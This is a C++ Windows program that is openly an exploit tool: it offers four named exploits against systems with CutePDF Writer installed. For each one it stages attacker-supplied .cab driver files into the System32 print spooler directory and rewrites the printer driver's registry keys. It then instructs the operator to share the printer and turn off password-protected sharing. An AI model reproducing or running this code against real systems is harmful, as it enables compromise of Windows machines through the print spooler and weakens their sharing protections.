#include <cstdlib>
#include <string>
#include <set>
#include <filesystem>
#include <windows.h>
#include <fstream>
#include "popl.hpp"

namespace
{
	const std::set<std::string> s_exploits = { "RADIANTDAMAGE", "POISONDAMAGE", "ACIDDAMAGE", "SLASHINGDAMAGE" };

	bool parseCLI(int p_argc, const char* p_argv[], std::string& p_exploit)
	{
		popl::OptionParser op("CLI options");
		auto help = op.add<popl::Switch>("h", "help", "Display the help message");
		auto exploit = op.add<popl::Value<std::string>>("e", "exploit", "The exploit to use");
		op.parse(p_argc, p_argv);

		if (p_argc == 1 || help->is_set())
		{
			std::cout << op << std::endl;
			std::cout << "Exploits available:" << std::endl;

			for (std::set<std::string>::iterator it = s_exploits.begin(); it != s_exploits.end(); ++it)
			{
				std::cout << "\t" << *it << std::endl;
			}
			return false;
		}

		if (!exploit->is_set())
		{
			std::cerr << "[-] Must provide an exploit." << std::endl;
			return false;
		}
		else if (s_exploits.find(exploit->value(0)) == s_exploits.end())
		{
			std::cout << "[!] User provided exploit is invalid" << std::endl;
			return false;
		}

		p_exploit.assign(exploit->value(0));
		return true;
	}
}

int main(int p_argc, const char* p_argv[])
{
	std::string exploit;
	if (!parseCLI(p_argc, p_argv, exploit))
	{
		return EXIT_FAILURE;
	}

	std::cout << "[+] Checking CutePDF Writer is installed" << std::endl;
	HKEY hqtRead = NULL;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Drivers\\Version-3\\CutePDF Writer v4.0", 0, KEY_READ, &hqtRead) != ERROR_SUCCESS)
	{
		std::cout << "[!] CutePDF Writer doesn't appear to be installed." << std::endl;
		RegCloseKey(hqtRead);
		return EXIT_FAILURE;
	}
	RegCloseKey(hqtRead);

	std::string inf_path;
	if (exploit == "RADIANTDAMAGE")
	{
		std::cout << "[+] Staging RADIANTDAMAGE files" << std::endl;
		std::filesystem::create_directory("C:\\TR1506\\");
		inf_path.assign("C:\\TR1506\\TR1506.inf");
		std::filesystem::copy("cab_files\\RADIANTDAMAGE\\TR1506.cab", "C:\\Windows\\System32\\spool\\drivers\\x64\\PCC\\", std::filesystem::copy_options::update_existing);
	}
	else if (exploit == "POISONDAMAGE")
	{
		std::cout << "[+] Staging POISONDAMAGE files" << std::endl;
		std::filesystem::create_directory("C:\\oemsetup\\");
		inf_path.assign("C:\\oemsetup\\oemsetup.inf");
		std::filesystem::copy("cab_files\\POISONDAMAGE\\oemsetup.cab", "C:\\Windows\\System32\\spool\\drivers\\x64\\PCC\\", std::filesystem::copy_options::update_existing);
	}
	else if (exploit == "ACIDDAMAGE")
	{
		std::cout << "[+] Staging ACIDDAMAGE files" << std::endl;
		std::filesystem::create_directory("C:\\LMUD1o40\\");
		inf_path.assign("C:\\LMUD1o40\\LMUD1o40.inf");
		std::filesystem::copy("cab_files\\ACIDDAMAGE\\LMUD1o40.cab", "C:\\Windows\\System32\\spool\\drivers\\x64\\PCC\\", std::filesystem::copy_options::update_existing);
	}
	else if (exploit == "SLASHINGDAMAGE")
	{
		std::cout << "[+] Staging SLASHINGDAMAGE files" << std::endl;
		std::filesystem::create_directory("C:\\slashing_damage\\");
		inf_path.assign("C:\\slashing_damage\\slashing_damage.inf");
		std::filesystem::copy("cab_files\\SLASHINGDAMAGE\\slashing_damage.cab", "C:\\Windows\\System32\\spool\\drivers\\x64\\PCC\\");
	}
	else
	{
		std::cout << "[-] Invalid exploit provided" << std::endl;
		return EXIT_FAILURE;
	}

	std::ofstream ofs(inf_path, std::ios::binary | std::ios::out);
	ofs.close();

	std::cout << "[+] Opening CutePDF Writer registry for writing" << std::endl;
	HKEY hqtWrite = NULL;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Drivers\\Version-3\\CutePDF Writer v4.0", 0, KEY_WRITE, &hqtWrite) != ERROR_SUCCESS)
	{
		std::cout << "[!] Insufficient permissions to edit registry?." << std::endl;
		RegCloseKey(hqtWrite);
		return EXIT_FAILURE;
	}

	std::cout << "[+] Setting PrinterDriverAttributes" << std::endl;
	uint32_t attr = 1;
	RegSetValueEx(hqtWrite, L"PrinterDriverAttributes", 0, REG_DWORD, (BYTE*)&attr, sizeof(uint32_t));

	std::wstring winf_path(inf_path.begin(), inf_path.end());
	std::cout << "[+] Setting InfPath" << std::endl;
	RegSetValueEx(hqtWrite, L"InfPath", 0, REG_SZ, (const BYTE*)winf_path.c_str(), (DWORD)winf_path.size() * 2);
	RegCloseKey(hqtWrite);

	std::cout << "[+] Done." << std::endl; 
	std::cout << "[!] MANUAL STEPS!" << std::endl;
	std::cout << "[1] Set CutePDF Writer as a shared printer" << std::endl;
	std::cout << "[2] In Advanced Sharing Settings, Turn on file and printer sharing." << std::endl;
	std::cout << "[3] In Advanced Sharing Settings, Turn off password protected sharing." << std::endl;
	std::cout << "[4] Reboot" << std::endl;
	return EXIT_SUCCESS;
}
